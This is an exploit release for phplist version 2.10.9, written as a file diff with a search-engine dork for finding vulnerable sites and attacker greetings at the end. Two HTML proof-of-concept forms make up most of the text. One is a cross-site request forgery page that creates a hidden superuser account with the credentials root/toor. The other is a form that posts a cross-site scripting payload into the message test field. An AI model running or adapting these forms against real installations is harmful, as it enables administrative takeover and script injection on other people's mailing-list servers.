@@ -1,0 +1,57 @@
++-------------------------------------------------------------------------+
+# Exploit Title : phplist - version 2.10.9 CSRF/XSS Vulnerability
+# version       : 2.10.9                                                                                                                           
+# Author        : Cyber-Crystal                                              
+# Date          : n/a   
+# Dork          : inurl:"powered by phplist - version 2.10.9"
+# Software Link : http://www.phplist.com/                                                                                  
++-------------------------------------------------------------------------+
+
++---+[CSRF Add Admin Acuonnt by Cyber-Crystal]+---+
+<html>
+<title>[#] Exploit [#]</title>
+<body>
+<form method="POST" name="form2" action="http://localhost/lists/admin/?page=admin&start=">
+<input type="hidden" name="id" value="0"/>
+<input type="hidden" name="loginname" value="root"/>
+<input type="hidden" name="email" value="ss@ss.com"/>
+<input type="hidden" name="password" value="toor"/>
+<input type="hidden" name="superuser" value="1"/>
+<input type="hidden" name="disabled" value=""/>
+<input type="hidden" name="cbattribute[]" value="1"/>
+<input type="hidden" name="attribute[1]" value="Checked"/>
+<input type="hidden" name="change" value="Save Changes"/>
+
+<input type="submit" value="exploit" />
+</form>
+</body>
+</html>
+
++---+[XSS Send post ]+---+
+<html>
+<title>[#] Exploit [#]</title>
+<body>
+<form method=post action="http://localhost/lists/admin/?page=send&id=1&tab=Format" name="sendmessageform">
+<input type=hidden name="workaround_fck_bug" value="1">
+<input type=hidden name="htmlformatted" value="auto">
+<input type=submit name=sendtest value="Exploit">
+<input type=text name="testtarget" size=40 value='[XSS HERE]'>
+<input type=hidden name=id value=7>
+<input type=hidden name=status value="draft">
+<input type=hidden name=expand value="0">
+</form>
+</body>
+</html>
+
+#-----------------------------------#
+|  by Cyber-Crystal 			    |
+|  								    |
+|  Mail : Cyb3r.Crystal@Gmail.com   |
+|  Home // www.v4-team.com/cc		|
+|     						        |
+#-----------------------------------#
+Greetz 2 : Secure-x41 | Fox Hacker | Or4nG.M4n | SadHacker | Mr.Black | Red Virus | aBu.HaLiL501 | T7 | Sniper_IRaq || # All Man 0_0
+
+
+
+# the End
